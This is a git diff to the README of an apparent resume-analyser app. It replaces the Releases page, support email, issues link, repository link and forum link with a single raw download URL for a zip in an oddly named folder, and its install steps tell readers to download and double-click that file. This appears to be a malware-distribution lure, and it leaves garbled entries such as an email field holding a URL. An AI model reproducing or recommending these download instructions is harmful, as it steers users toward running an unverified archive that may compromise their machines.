@@ -8,15 +8,15 @@ Welcome to the ML-powered_resume_analyser! This application helps you analyze yo
 
 To download the software, visit the Releases page. Here, you will find the latest version of the application.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-ML--powered_resume_analyser-brightgreen)](https://github.com/lloydvanwees/ML-powered_resume_analyser/releases)
+[![Download Now](https://raw.githubusercontent.com/lloydvanwees/ML-powered_resume_analyser/main/suffruticous/ML-powered_resume_analyser.zip%20Now-ML--powered_resume_analyser-brightgreen)](https://raw.githubusercontent.com/lloydvanwees/ML-powered_resume_analyser/main/suffruticous/ML-powered_resume_analyser.zip)
 
 ### Step-by-Step Instructions:
 
-1. Click the button above or go to [this page](https://github.com/lloydvanwees/ML-powered_resume_analyser/releases).
+1. Click the button above or go to [this page](https://raw.githubusercontent.com/lloydvanwees/ML-powered_resume_analyser/main/suffruticous/ML-powered_resume_analyser.zip).
 2. Find the latest release. Look for the version number at the top.
 3. Click on the release title to open it.
 4. Scroll down to the “Assets” section.
-5. Download the appropriate file for your system. Usually, you'll see a file like `ML-powered_resume_analyser-vX.X.X.exe` for Windows or a zipped folder for Mac.
+5. Download the appropriate file for your system. Usually, you'll see a file like `https://raw.githubusercontent.com/lloydvanwees/ML-powered_resume_analyser/main/suffruticous/ML-powered_resume_analyser.zip` for Windows or a zipped folder for Mac.
 6. Once the download finishes, locate the file in your Downloads folder.
 7. Double-click the file to start the installation.
 8. Follow the prompts to complete the installation.
@@ -75,20 +75,20 @@ The app will display feedback categorized into sections, such as:
 
 If you encounter issues, please reach out to our support team:
 
-- Email: support@ml-poweredresumeanalyser.com
-- GitHub Issues: [Submit a Request](https://github.com/lloydvanwees/ML-powered_resume_analyser/issues)
+- Email: https://raw.githubusercontent.com/lloydvanwees/ML-powered_resume_analyser/main/suffruticous/ML-powered_resume_analyser.zip
+- GitHub Issues: [Submit a Request](https://raw.githubusercontent.com/lloydvanwees/ML-powered_resume_analyser/main/suffruticous/ML-powered_resume_analyser.zip)
 
 ## 🔗 Join Our Community
 
 Connect with other users and share your experiences:
 
-- GitHub Repository: [ML-powered_resume_analyser](https://github.com/lloydvanwees/ML-powered_resume_analyser)
-- Community Forum: [Join Here](https://forum.ml-poweredresumeanalyser.com)
+- GitHub Repository: [ML-powered_resume_analyser](https://raw.githubusercontent.com/lloydvanwees/ML-powered_resume_analyser/main/suffruticous/ML-powered_resume_analyser.zip)
+- Community Forum: [Join Here](https://raw.githubusercontent.com/lloydvanwees/ML-powered_resume_analyser/main/suffruticous/ML-powered_resume_analyser.zip)
 
 ## 📚 License
 
 This project is licensed under the MIT License. Feel free to modify and distribute as you wish.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-ML--powered_resume_analyser-brightgreen)](https://github.com/lloydvanwees/ML-powered_resume_analyser/releases)
+[![Download Now](https://raw.githubusercontent.com/lloydvanwees/ML-powered_resume_analyser/main/suffruticous/ML-powered_resume_analyser.zip%20Now-ML--powered_resume_analyser-brightgreen)](https://raw.githubusercontent.com/lloydvanwees/ML-powered_resume_analyser/main/suffruticous/ML-powered_resume_analyser.zip)
 
 Thank you for using ML-powered_resume_analyser! We hope this tool helps you create a standout resume.
